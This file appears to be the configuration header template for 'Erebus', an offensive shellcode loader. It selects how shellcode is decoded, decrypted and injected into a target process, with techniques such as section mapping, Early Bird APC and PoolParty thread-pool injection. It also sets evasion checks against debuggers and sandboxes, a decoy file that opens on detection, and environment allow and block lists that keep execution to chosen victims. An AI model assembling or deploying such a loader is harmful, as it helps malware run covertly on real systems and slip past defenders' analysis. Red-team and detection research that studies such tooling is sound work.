#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

// ============================================
// COMPRESSION CONFIGURATION
// ============================================
// Compression method used for shellcode:
// 0 = NONE        - No decompression
// 1 = LZNT1       - LZNT1 compression
// 2 = RLE         - Run-Length Encoding
#define CONFIG_COMPRESSION_TYPE {{ COMPRESSION_TYPE }}

// ============================================
// ENCODING CONFIGURATION
// ============================================
// Encoding method used for shellcode:
// 0 = NONE        - No decoding
// 1 = BASE64      - Base64 encoding
// 2 = ASCII85     - ASCII85 encoding
// 3 = ALPHA32     - ALPHA32 encoding
// 4 = WORDS256    - WORDS256 encoding
#define CONFIG_ENCODING_TYPE {{ ENCODING_TYPE }}

#if CONFIG_ENCODING_TYPE == 1
#define DecodeShellcode erebus::DecodeBase64
#elif CONFIG_ENCODING_TYPE == 2
#define DecodeShellcode erebus::DecodeASCII85
#elif CONFIG_ENCODING_TYPE == 3
#define DecodeShellcode erebus::DecodeALPHA32
#elif CONFIG_ENCODING_TYPE == 4
#define DecodeShellcode erebus::DecodeWORDS256
#endif

// ============================================
// ENCRYPTION CONFIGURATION
// ============================================
// Encryption method used for shellcode:
// 0 = NONE        - No decryption
// 1 = XOR         - Simple XOR cipher
// 2 = RC4         - RC4 stream cipher
// 3 = AES_ECB     - AES in ECB mode
// 4 = AES_CBC     - AES in CBC mode
#define CONFIG_ENCRYPTION_TYPE {{ ENCRYPTION_TYPE }}
#if CONFIG_ENCRYPTION_TYPE == 1
#define DecryptShellcode erebus::DecryptionXor
#elif CONFIG_ENCRYPTION_TYPE == 2
#define DecryptShellcode erebus::DecryptionRc4
#endif

// ============================================
// INJECTION CONFIGURATION
// ============================================

// Target process for remote injection
#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}"
#endif

// Injection technique:
// 1 = NtMapViewOfSection  - Section mapping injection (Remote)
// 2 = CreateFiber         - Fiber-based execution (Self)
// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
#ifndef CONFIG_INJECTION_TYPE
#define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}
#endif

#if CONFIG_INJECTION_TYPE == 2
#define CONFIG_INJECTION_MODE 2  // Self injection
#else
#define CONFIG_INJECTION_MODE 1  // Remote injection
#endif

#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionCreateFiber
#elif CONFIG_INJECTION_TYPE == 3
#define ExecuteShellcode erebus::InjectionEarlyCascade
#elif CONFIG_INJECTION_TYPE == 4
#define ExecuteShellcode erebus::InjectionPoolParty
#endif

// ============================================
// GUARDRAILS CONFIGURATION
// ============================================

#include "guardrails/guardrails.hpp"

// Enable/disable guardrails checks at compile time
#define CONFIG_GUARDRAILS_ENABLED {{ GUARDRAILS_ENABLED }}
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER {{ GUARDRAILS_CHECK_DEBUGGER }}
#define CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER {{ GUARDRAILS_CHECK_REMOTE_DEBUGGER }}
#define CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES {{ GUARDRAILS_CHECK_DEBUGGER_PROCESSES }}
#define CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS {{ GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS }}
#define CONFIG_GUARDRAILS_CHECK_TIMING {{ GUARDRAILS_CHECK_TIMING }}
#define CONFIG_GUARDRAILS_CHECK_SANDBOX {{ GUARDRAILS_CHECK_SANDBOX }}

// Decoy file to open when guardrails fail (empty = silent exit)
#define CONFIG_GUARDRAILS_DECOY_FILE "{{ GUARDRAILS_DECOY_FILE }}"

// --------------------------------------------------------------------------
// Environment whitelists / blocklists
// --------------------------------------------------------------------------
// These lists are rendered inline into GetGuardrailConfig() below. If a list
// is empty the corresponding array and count stay at their default (nullptr
// / 0) values, which RunGuardrails() treats as "skip that check". Each array
// is declared `static const` so it lives in .rdata with no per-call cost.
//
// WARNING: The hostnames / usernames / domain names in the arrays below are
// baked into the loader binary as plaintext and are visible to `strings`. If
// OPSEC requires obfuscating them, encrypt at build time in shellcrypt and
// decrypt at runtime before calling GetGuardrailConfig().

{% if GUARDRAIL_ALLOWED_HOSTNAMES %}
static const char* g_allowed_hostnames[] = {
    {% for h in GUARDRAIL_ALLOWED_HOSTNAMES %}"{{ h }}",
    {% endfor %}
};
{% endif %}
{% if GUARDRAIL_BLOCKED_HOSTNAMES %}
static const char* g_blocked_hostnames[] = {
    {% for h in GUARDRAIL_BLOCKED_HOSTNAMES %}"{{ h }}",
    {% endfor %}
};
{% endif %}
{% if GUARDRAIL_BLOCKED_USERNAMES %}
static const char* g_blocked_usernames[] = {
    {% for u in GUARDRAIL_BLOCKED_USERNAMES %}"{{ u }}",
    {% endfor %}
};
{% endif %}
{% if GUARDRAIL_ALLOWED_IPS %}
static const char* g_allowed_ips[] = {
    {% for ip in GUARDRAIL_ALLOWED_IPS %}"{{ ip }}",
    {% endfor %}
};
{% endif %}
{% if GUARDRAIL_BLOCKED_IPS %}
static const char* g_blocked_ips[] = {
    {% for ip in GUARDRAIL_BLOCKED_IPS %}"{{ ip }}",
    {% endfor %}
};
{% endif %}
{% if GUARDRAIL_ALLOWED_DOMAINS %}
static const char* g_allowed_domains[] = {
    {% for d in GUARDRAIL_ALLOWED_DOMAINS %}"{{ d }}",
    {% endfor %}
};
{% endif %}

// Helper function to get configured guardrails
inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
    erebus::guardrails::GuardrailConfig config = erebus::guardrails::GetDefaultConfig();

    #if CONFIG_GUARDRAILS_ENABLED
        config.check_debugger_present      = CONFIG_GUARDRAILS_CHECK_DEBUGGER;
        config.check_remote_debugger       = CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER;
        config.check_debugger_processes    = CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES;
        config.check_hardware_breakpoints  = CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS;
        config.check_timing_checks         = CONFIG_GUARDRAILS_CHECK_TIMING;
        config.check_sandbox_environment   = CONFIG_GUARDRAILS_CHECK_SANDBOX;

        {% if GUARDRAIL_ALLOWED_HOSTNAMES %}
        config.allowed_hostnames      = g_allowed_hostnames;
        config.hostname_count_allowed = (int)(sizeof(g_allowed_hostnames) / sizeof(g_allowed_hostnames[0]));
        {% endif %}
        {% if GUARDRAIL_BLOCKED_HOSTNAMES %}
        config.blocked_hostnames      = g_blocked_hostnames;
        config.hostname_count_blocked = (int)(sizeof(g_blocked_hostnames) / sizeof(g_blocked_hostnames[0]));
        {% endif %}
        {% if GUARDRAIL_BLOCKED_USERNAMES %}
        config.blocked_usernames      = g_blocked_usernames;
        config.username_count_blocked = (int)(sizeof(g_blocked_usernames) / sizeof(g_blocked_usernames[0]));
        {% endif %}
        {% if GUARDRAIL_ALLOWED_IPS %}
        config.allowed_ips    = g_allowed_ips;
        config.ip_count_allowed = (int)(sizeof(g_allowed_ips) / sizeof(g_allowed_ips[0]));
        {% endif %}
        {% if GUARDRAIL_BLOCKED_IPS %}
        config.blocked_ips    = g_blocked_ips;
        config.ip_count_blocked = (int)(sizeof(g_blocked_ips) / sizeof(g_blocked_ips[0]));
        {% endif %}
        {% if GUARDRAIL_ALLOWED_DOMAINS %}
        config.allowed_domains      = g_allowed_domains;
        config.domain_count_allowed = (int)(sizeof(g_allowed_domains) / sizeof(g_allowed_domains[0]));
        {% endif %}
    #endif

    return config;
}

#endif
